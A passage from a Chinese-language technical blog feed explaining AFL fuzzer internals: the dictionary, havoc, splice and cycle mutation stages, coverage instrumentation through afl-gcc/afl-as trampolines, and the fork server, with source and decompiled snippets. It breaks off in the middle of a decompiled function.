title="dictionary"></a>dictionary</h1><p>进入到这个阶段，就接近deterministic fuzzing的尾声了。具体有以下子阶段：</p><ul><li>user extras (over)，从头开始，将<strong>用户提供</strong>的tokens依次<strong>替换</strong>到原文件中</li><li>user extras (insert)，从头开始，将<strong>用户提供</strong>的tokens依次<strong>插入</strong>到原文件中</li><li>auto extras (over)，从头开始，将<strong>自动检测</strong>的tokens依次<strong>替换</strong>到原文件中</li></ul><p>其中，用户提供的tokens，是在词典文件中设置并通过<code>-x</code>选项指定的，如果没有则跳过相应的子阶段。</p><h2 id="user-extras-over"><a href="#user-extras-over" class="headerlink" title="user extras (over)"></a>user extras (over)</h2><p>对于用户提供的tokens，AFL先按照长度从小到大进行排序。这样做的好处是，只要按照顺序使用排序后的tokens，那么后面的token不会比之前的短，从而每次覆盖替换后不需要再恢复到原状。</p><p>随后，AFL会检查tokens的数量，如果数量大于预设的<code>MAX_DET_EXTRAS</code>（默认值为200），那么对每个token会根据概率来决定是否进行替换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">for (j &#x3D; 0; j &lt; extras_cnt; j++) &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Skip extras probabilistically if extras_cnt &gt; MAX_DET_EXTRAS. Also skip them if there&#39;s no room to insert the payload, if the token is redundant, or if its entire span has no bytes set in the effector map. *&#x2F;</span><br><span class="line"></span><br><span class="line">  if ((extras_cnt &gt; MAX_DET_EXTRAS &amp;&amp; UR(extras_cnt) &gt;&#x3D; MAX_DET_EXTRAS) ||</span><br><span class="line">      extras[j].len &gt; len - i ||</span><br><span class="line">      !memcmp(extras[j].data, out_buf + i, extras[j].len) ||</span><br><span class="line">      !memchr(eff_map + EFF_APOS(i), 1, EFF_SPAN_ALEN(i, extras[j].len))) &#123;</span><br><span class="line"></span><br><span class="line">    stage_max--;</span><br><span class="line">    continue;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里的<code>UR(extras_cnt)</code>是运行时生成的一个<code>0</code>到<code>extras_cnt</code>之间的随机数。所以，如果用户词典中一共有400个tokens，那么每个token就有<code>200/400=50%</code>的概率执行替换变异。我们可以修改<code>MAX_DET_EXTRAS</code>的大小来调整这一概率。</p><p>由上述代码也可以看到，effector map在这里同样被使用了：如果要替换的目标bytes全部是“无效”的，那么就跳过这一段，对下一段目标执行替换。</p><h2 id="user-extras-insert"><a href="#user-extras-insert" class="headerlink" title="user extras (insert)"></a>user extras (insert)</h2><p>这一子阶段是对用户提供的tokens执行插入变异。不过与上一个子阶段不同的是，此时并没有对tokens数量的限制，所以全部tokens都会从原文件的第1个byte开始，依次向后插入；此外，由于原文件并未发生替换，所以effector map不会被使用。</p><p>这一子阶段最特别的地方，就是变异不能简单地恢复。之前每次变异完，在变异位置处简单取逆即可，例如bitflip后，再进行一次同样的bitflip就恢复为原文件。正因为如此，之前的变异总体运算量并不大。</p><p>但是，对于<strong>插入</strong>这种变异方式，恢复起来则复杂的多，所以AFL采取的方式是：将原文件分割为插入前和插入后的部分，再加上插入的内容，将这3部分依次复制到目标缓冲区中（当然这里还有一些小的优化，具体可阅读代码）。而对每个token的每处插入，都需要进行上述过程。所以，如果用户提供了大量tokens，或者原文件很大，那么这一阶段的运算量就会非常的多。直观表现上，就是AFL的执行状态栏中，”user extras (insert)”的总执行量很大，执行时间很长。如果出现了这种情况，那么就可以考虑适当删减一些tokens。</p><h2 id="auto-extras-over"><a href="#auto-extras-over" class="headerlink" title="auto extras (over)"></a>auto extras (over)</h2><p>这一项与”user extras (over)”很类似，区别在于，这里的tokens是最开始bitflip阶段自动生成的。另外，自动生成的tokens总量会由<code>USE_AUTO_EXTRAS</code>限制（默认为10）。</p><h1 id="havoc"><a href="#havoc" class="headerlink" title="havoc"></a>havoc</h1><p>对于非dumb mode的主fuzzer来说，完成了上述deterministic fuzzing后，便进入了充满随机性的这一阶段；对于dumb mode或者从fuzzer来说，则是直接从这一阶段开始。</p><p>havoc，顾名思义，是充满了各种随机生成的变异，是对原文件的“大破坏”。具体来说，havoc包含了对原文件的多轮变异，每一轮都是将多种方式组合（stacked）而成：</p><ul><li>随机选取某个bit进行翻转</li><li>随机选取某个byte，将其设置为随机的interesting value</li><li>随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个byte，对其减去一个随机数</li><li>随机选取某个byte，对其加上一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个byte，将其设置为随机数</li><li>随机删除一段bytes</li><li>随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</li><li>随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</li></ul><p>怎么样，看完上面这么多的“随机”，有没有觉得晕？还没完，AFL会生成一个随机数，作为变异组合的数量，并根据这个数量，每次从上面那些方式中随机选取一个（可以参考高中数学的有放回摸球），依次作用到文件上。如此这般丧心病狂的变异，原文件就大概率面目全非了，而这么多的随机性，也就成了fuzzing过程中的不可控因素，即所谓的“看天吃饭”了。</p><h1 id="splice"><a href="#splice" class="headerlink" title="splice"></a>splice</h1><p>历经了如此多的考验，文件的变异也进入到了最后的阶段：splice。如其意思所说，splice是将两个seed文件拼接得到新的文件，并对这个新文件继续执行havoc变异。</p><p>具体地，AFL在seed文件队列中随机选取一个，与当前的seed文件做对比。如果两者差别不大，就再重新随机选一个；如果两者相差比较明显，那么就随机选取一个位置，将两者都分割为头部和尾部。最后，将当前文件的头部与随机文件的尾部拼接起来，就得到了新的文件。在这里，AFL还会过滤掉拼接文件未发生变化的情况。</p><h1 id="cycle"><a href="#cycle" class="headerlink" title="cycle"></a>cycle</h1><p>于是乎，一个seed文件，在上述的全部变异都执行完成后，就…抱歉，还没结束。</p><p>上面的变异完成后，AFL会对文件队列的下一个进行变异处理。当队列中的全部文件都变异测试后，就完成了一个”cycle”，这个就是AFL状态栏右上角的”cycles done”。而正如cycle的意思所说，整个队列又会从第一个文件开始，再次进行变异，不过与第一次变异不同的是，这一次就不需要再进行deterministic fuzzing了。</p><p>当然，如果用户不停止AFL，那么seed文件将会一遍遍的变异下去。</p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Afl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AFL </tag>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL细节小计</title>
      <link href="posts/53fcd800/"/>
      <url>posts/53fcd800/</url>
      
        <content type="html"><![CDATA[<h1 id="覆盖率"><a href="#覆盖率" class="headerlink" title="覆盖率"></a>覆盖率</h1><p>代码覆盖率，是一种通过计算测试过程中被执行的源代码占全部源代码的比例，进而间接度量软件质量的方法。其计量方式很多，但无论是 GCC 的 GCOV 还是 LLVM 的 SanitizerCoverage，都提供函数（function）、基本块（basic-block）、边界（edge）三种级别的覆盖率检测。</p><h2 id="函数（Fuction-Level）"><a href="#函数（Fuction-Level）" class="headerlink" title="函数（Fuction-Level）"></a><strong>函数（Fuction-Level）</strong></h2><p>函数就是代码执行时调用到哪些函数，但是函数里面的具体代码行却不作统计，相对比较粗糙但高效的统计方式。所以，通常的统计方式是用基本块，简称BB。</p><h2 id="基本块（BasicBlock-Level）"><a href="#基本块（BasicBlock-Level）" class="headerlink" title="基本块（BasicBlock-Level）"></a><strong>基本块（BasicBlock-Level）</strong></h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210413173114.png" alt="image-20210413173114591"></p><p>IDA中每一块代码就代表着一个基本块，就是以指令跳转为作划分界限的。</p><h2 id="边界（Edge-Level）"><a href="#边界（Edge-Level）" class="headerlink" title="边界（Edge-Level）"></a><strong>边界（Edge-Level）</strong></h2><p>edge本身就涵盖了基本块部分，唯一的差别是edge多记录了一些执行边界的信息。</p><p>我们可以将程序看成一个控制流图（CFG），图的每个节点表示一个基本块，而edge就被用来表示在基本块之间的转跳。知道了每个基本块和跳转的执行次数，就可以知道程序中的每个语句和分支的执行次数，从而获得比记录BB更细粒度的覆盖率信息。</p><p>具体到AFL的实现中，使用二元组(branch_src, branch_dst)来记录<strong>当前基本块</strong> + <strong>前一基本块</strong> 的信息，从而获取目标的执行流程和代码覆盖情况，下文会详细介绍。</p><h1 id="代码插桩"><a href="#代码插桩" class="headerlink" title="代码插桩"></a>代码插桩</h1><p><code>afl</code>插桩的代码写在<code>afl-gcc.c</code>里面，afl-gcc 是 gcc 的一个封装(wrapper)。主要实现的下述的三个功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find_as(argv[<span class="number">0</span>]);                         <span class="comment">//找到gcc/clang/llvm编译器</span></span><br><span class="line">edit_params(argc, argv);                  <span class="comment">//设置cc的参数</span></span><br><span class="line">execvp(cc_params[<span class="number">0</span>], (<span class="keyword">char</span>**)cc_params);  <span class="comment">//执行</span></span><br></pre></td></tr></table></figure><p>我们在 <code>execvp</code>之前，加入一段代码打印出<code>cc_params</code>的参数如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$:./afl-gcc demo.c -o <span class="built_in">test</span>                                                                                                    </span><br><span class="line">afl-cc 2.52b by &lt;lcamtuf@google.com&gt;</span><br><span class="line">        arg0: gcc</span><br><span class="line">        arg1: demo.c</span><br><span class="line">        arg2: -o</span><br><span class="line">        arg3: <span class="built_in">test</span></span><br><span class="line">        arg4: -B</span><br><span class="line">        arg5: .</span><br><span class="line">        arg6: -g</span><br><span class="line">        arg7: -O3</span><br><span class="line">        arg8: -funroll-loops</span><br><span class="line">        arg9: -D__AFL_COMPILER=1</span><br><span class="line">        arg10: -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</span><br></pre></td></tr></table></figure><p>我们知道一个二进制文件完整的流程是：预处理 -&gt; 编译 -&gt; 汇编 -&gt; 链接。而将汇编代码编译成为二进制的工具，即为汇编器assembler。Linux系统下的常用汇编器是<code>as</code>。编译完成<code>AFL</code>后，在其目录下也会存在一个<code>as</code>文件，并作为符号链接指向<code>afl-as</code>。所以，如果通过<code>-B</code>选项为<code>gcc</code>设置了搜索路径(根据gcc –help可知)，那么<code>afl-as</code>便会作为汇编器，执行实际的汇编操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-funroll-loops     ：执行循环强度消除并消除在循环内部使用的变量。这是用简单而快速的操作（如加法和减法）替代耗时操作（如乘法和除法）的过程</span><br><span class="line">-B &lt; &gt;             ：设置编译器的搜索路径。</span><br><span class="line">ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION     &#x2F;* a flag also shared with libfuzzer) or *&#x2F;</span><br><span class="line">ifdef __AFL_COMPILER                             &#x2F;* (this one is just for AFL). *&#x2F;</span><br></pre></td></tr></table></figure><p>反汇编我们刚刚所编译出来的 test 文件可以发现其中多了一些汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400860</span><br><span class="line">.text:0000000000400860 argc &#x3D; rdi                              ; int</span><br><span class="line">.text:0000000000400860 argv &#x3D; rsi                              ; char **</span><br><span class="line">.text:0000000000400860 ; __unwind &#123;</span><br><span class="line">.text:0000000000400860                 lea     rsp, [rsp-98h]</span><br><span class="line">.text:0000000000400868                 mov     [rsp+98h+var_98], rdx</span><br><span class="line">.text:000000000040086C                 mov     [rsp+98h+var_90], rcx</span><br><span class="line">.text:0000000000400871                 mov     [rsp+98h+var_88], rax</span><br><span class="line">.text:0000000000400876                 mov     rcx, 459Eh</span><br><span class="line">.text:000000000040087D                 call    __afl_maybe_log</span><br><span class="line">.text:0000000000400882                 mov     rax, [rsp+98h+var_88]</span><br><span class="line">.text:0000000000400887                 mov     rcx, [rsp+98h+var_90]</span><br><span class="line">.text:000000000040088C                 mov     rdx, [rsp+98h+var_98]</span><br><span class="line">.text:0000000000400890                 lea     rsp, [rsp+98h]</span><br></pre></td></tr></table></figure><p>阅读<code>afl-as.c</code>发现插桩完成在 <code>add_instrumentation</code>函数内部</p><blockquote><p><code>fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE));</code></p></blockquote><p>这里 afl 通过调用 fprintf 将 trampoline_fmt_64 或者 trampoline_fmt_32 插入目标的代码段，以完成插桩来计算代码覆盖率。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-as.h</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8* trampoline_fmt_32 =</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leal -16(%%esp), %%esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%edi,  0(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%edx,  4(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%ecx,  8(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%eax, 12(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl $0x%08x, %%ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl 12(%%esp), %%eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl  8(%%esp), %%ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl  4(%%esp), %%edx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl  0(%%esp), %%edi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leal 16(%%esp), %%esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8* trampoline_fmt_64 =</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rdx,  0(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rcx,  8(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rax, 16(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq $0x%08x, %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq 16(%%rsp), %%rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  8(%%rsp), %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  0(%%rsp), %%rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq (128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以看到插桩主要完成了（x64）：</p><ul><li>保存<code>rax</code> <code>rcx</code> <code>rdx</code> 等寄存器的值</li><li>将<code>ecx</code>的值设置为随机数</li><li>调用<code>__afl_maybe_log</code></li><li>恢复原寄存器的数据</li></ul><p>关于<code>&quot;movq $0x%08x, %%rcx\n&quot;</code>这条汇编代码其对应<code>fprintf</code>中的参数为<code>R(MAP_SIZE)</code>，根据定义，宏<code>MAP_SIZE</code>为64K；<code>R(x)</code>的定义是<code>(random() % (x))</code>，所以<code>R(MAP_SIZE)</code>即为0到MAP_SIZE之间的一个随机数。这里的R(x)实际上是用来区分每个代码块的，也就是是一个标识。</p><p>关于<code>__afl_maybe_log()</code>的详细实现会在下文提及。</p><h1 id="fork-server"><a href="#fork-server" class="headerlink" title="fork server"></a>fork server</h1><p>afl 的流程大致是：对输入的样本文件不断地变异，并将这些 mutated input 喂给 loader 执行，检查是否会造成崩溃。因此，fuzzing 涉及到大量的 fork 和执行 loader 的过程。但是对于简单的库，我们会花费大量时间去等待<code>execve()</code>，载入目标文件和库、解析符号地址等，为了避免这种情况，AFL实现了一套 fork server 机制。其基本思路是：启动target进程后，target会运行一个fork server；fuzzer并不负责fork子进程，而是与这个fork server通信，并由fork server来完成fork及继续执行目标的操作。</p><h2 id="init-fork-server"><a href="#init-fork-server" class="headerlink" title="init fork server"></a>init fork server</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-fuzz.c</span></span><br><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">init_forkserver</span><span class="params">(<span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">itimerval</span> <span class="title">it</span>;</span></span><br><span class="line">  <span class="keyword">int</span> st_pipe[<span class="number">2</span>], ctl_pipe[<span class="number">2</span>]; <span class="comment">//建立管道st_pipe和ctl_pipe，在父子进程之间，是通过管道进行通信，一个用于传递状态，另一个用于传递命令。</span></span><br><span class="line">  ...</span><br><span class="line">      </span><br><span class="line">  forksrv_pid = fork();        <span class="comment">//fork 出来一个子进程，父子进程之间通过管道进行通信。</span></span><br><span class="line">  ...</span><br><span class="line">      </span><br><span class="line">  <span class="keyword">if</span> (!forksrv_pid) &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="comment">/* Set up control and status pipes, close the unneeded original fds. */</span></span><br><span class="line">    <span class="keyword">if</span> (dup2(ctl_pipe[<span class="number">0</span>], FORKSRV_FD) &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;dup2() failed&quot;</span>);    <span class="comment">//对于子进程（fork server），会进行一系列设置，其中包括将上述两个管道分配到预先指定的fd，并最终执行target：</span></span><br><span class="line">    <span class="keyword">if</span> (dup2(st_pipe[<span class="number">1</span>], FORKSRV_FD + <span class="number">1</span>) &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;dup2() failed&quot;</span>);</span><br><span class="line">...</span><br><span class="line">    execv(target_path, argv);</span><br><span class="line">    <span class="comment">/* Use a distinctive bitmap signature to tell the parent about execv() falling through. */</span></span><br><span class="line">    *(u32*)trace_bits = EXEC_FAIL_SIG;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//对于父进程（fuzzer），则会读取状态管道的信息，如果一切正常，则说明fork server创建完成。</span></span><br><span class="line">  close(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line">  close(st_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  fsrv_ctl_fd = ctl_pipe[<span class="number">1</span>];</span><br><span class="line">  fsrv_st_fd  = st_pipe[<span class="number">0</span>];</span><br><span class="line">  ...</span><br><span class="line">      </span><br><span class="line">  rlen = read(fsrv_st_fd, &amp;status, <span class="number">4</span>);  <span class="comment">//从管道中读取4个字节</span></span><br><span class="line">  ...</span><br><span class="line">     <span class="comment">/* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set.</span></span><br><span class="line"><span class="comment">     Otherwise, try to figure out what went wrong. */</span></span><br><span class="line">  <span class="keyword">if</span> (rlen == <span class="number">4</span>) &#123;</span><br><span class="line">    OKF(<span class="string">&quot;All right - fork server is up.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  FATAL(<span class="string">&quot;Fork server handshake failed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>execv(target_path, argv)</code>带参数执行target，这个函数除非出错不然不会返回。</p><ul><li>execv会替换掉原有的进程空间为target_path代表的程序，所以相当于后续就是去执行target_path，这个程序结束的话，子进程就结束。</li><li><strong>此时由于我们的目标程序的 main 函数已经被插桩，程序的控制流会交到<code>_afl_maybe_log</code>手中。所以关于 fork server 的其余工作都在<code>_afl_maybe_log</code>中完成。而在这里非常特殊，第一个target会进入<code>__afl_maybe_log</code>里的<code>__afl_fork_wait_loop</code>，并充当fork server，在整个Fuzz的过程中，它都不会结束，每次要Fuzz一次target，都会从这个fork server fork出来一个子进程去fuzz。</strong></li></ul><h2 id="afl-maybe-log"><a href="#afl-maybe-log" class="headerlink" title="__afl_maybe_log()"></a>__afl_maybe_log()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __usercall _afl_maybe_log@&lt;al&gt;(<span class="keyword">char</span> a1@&lt;of&gt;, __int64 a2@&lt;rcx&gt;, __int64 a3@&lt;xmm0&gt;, __int64 a4@&lt;xmm1&gt;, __int64 a5@&lt;xmm2&gt;, __int64 a6@&lt;xmm3&gt;, __int64 a7@&lt;xmm4&gt;, __int64 a8@&lt;xmm5&gt;, __int64 a9@&lt;xmm6&gt;, __int64 a10@&lt;xmm7&gt;, __int64 a11@&lt;xmm8&gt;, __int64 a12@&lt;xmm9&gt;, __int64 a13@&lt;xmm10&gt;, __int64 a14@&lt;xmm11&gt;, __int64 a15@&lt;xmm12&gt;, __int64 a16@&lt;xmm13&gt;, __int64 a17@&lt;xmm14&gt;, __int64 a18@&lt;xmm15&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  v19 = _afl_area_ptr;</span><br><span class="line">  <span class="keyword">if</span> ( !_afl_area_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( _afl_setup_failure )</span><br><span class="line">      <span class="keyword">return</span> v18 + <span class="number">127</span>;</span><br><span class="line">    v19 = _afl_global_area_ptr;</span><br><span class="line">    <span class="keyword">if</span> ( _afl_global_area_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      _afl_area_ptr = _afl_global_area_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      v22 = getenv(<span class="string">&quot;__AFL_SHM_ID&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v22 || (v23 = atoi(v22), v24 = shmat(v23, <span class="number">0L</span>L, <span class="number">0</span>), v24 == (<span class="keyword">void</span> *)<span class="number">-1L</span>L) )</span><br><span class="line">      &#123;</span><br><span class="line">        ++_afl_setup_failure;</span><br><span class="line">        v18 = v29;</span><br><span class="line">        <span class="keyword">return</span> v18 + <span class="number">127</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      _afl_area_ptr = (__int64)v24;</span><br><span class="line">      _afl_global_area_ptr = v24;</span><br><span class="line">      v28 = (__int64)v24;</span><br><span class="line">      <span class="keyword">if</span> ( write(<span class="number">199</span>, &amp;_afl_temp, <span class="number">4u</span>LL) == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v25 = <span class="number">198</span>;</span><br><span class="line">          <span class="keyword">if</span> ( read(<span class="number">198</span>, &amp;_afl_temp, <span class="number">4u</span>LL) != <span class="number">4</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          LODWORD(v26) = fork();</span><br><span class="line">          <span class="keyword">if</span> ( v26 &lt; <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !v26 )</span><br><span class="line">            <span class="keyword">goto</span> __afl_fork_resume;</span><br><span class="line">          _afl_fork_pid = v26;</span><br><span class="line">          write(<span class="number">199</span>, &amp;_afl_fork_pid, <span class="number">4u</span>LL);</span><br><span class="line">          v25 = _afl_fork_pid;</span><br><span class="line">          LODWORD(v27) = waitpid(_afl_fork_pid, &amp;_afl_temp, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v27 &lt;= <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          write(<span class="number">199</span>, &amp;_afl_temp, <span class="number">4u</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">        _exit(v25);</span><br><span class="line">      